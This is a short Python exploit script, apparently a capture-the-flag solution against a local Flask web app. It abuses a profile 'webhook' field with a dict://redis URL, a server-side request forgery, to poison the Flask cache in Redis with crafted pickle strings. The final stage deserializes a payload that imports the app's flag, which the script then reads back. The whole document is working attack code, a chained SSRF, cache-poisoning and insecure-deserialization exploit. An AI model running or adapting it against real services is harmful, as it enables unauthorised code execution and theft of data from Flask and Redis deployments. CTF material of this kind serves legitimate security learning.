import pickle
import requests
import secrets

# Script của splitline#4881

base = "http://127.0.0.1:8000"

session = requests.Session()
session.post(base+"/register", data={"username": "meow", "password": "meow"})
session.post(base+"/login", data={"username": "meow", "password": "meow"})
session.post(base+"/create", data={"name": "meow"})
session.get(base+"/space/1/sub")

# 1
pkl = r'"!V\n."' # empty string
webhook = "dict://redis:6379/SET:flask_cache_app.routes.space.num_subscriptions_memver:" + pkl
print(webhook, len(webhook))
session.post(base+"/profile", data={"webhook": webhook}).text
session.post(base+"/space/1/post", data={"content": secrets.token_hex(8)})
session.get(base+"/space/1") # trigger ssrf

# 2
pkl2 = r'"!capp\nflag\n."' # from app import flag
webhook = "dict://redis:6379/SET:flask_cache_xk28vUr8TTGcOgNT:" + pkl2
print(webhook, len(webhook))
session.post(base+"/profile", data={"webhook": webhook}).text
session.post(base+"/space/1/post", data={"content": secrets.token_hex(8)})
session.get(base+"/space/1").text # trigger ssrf

print(session.get(base+"/space/1").text) # get flag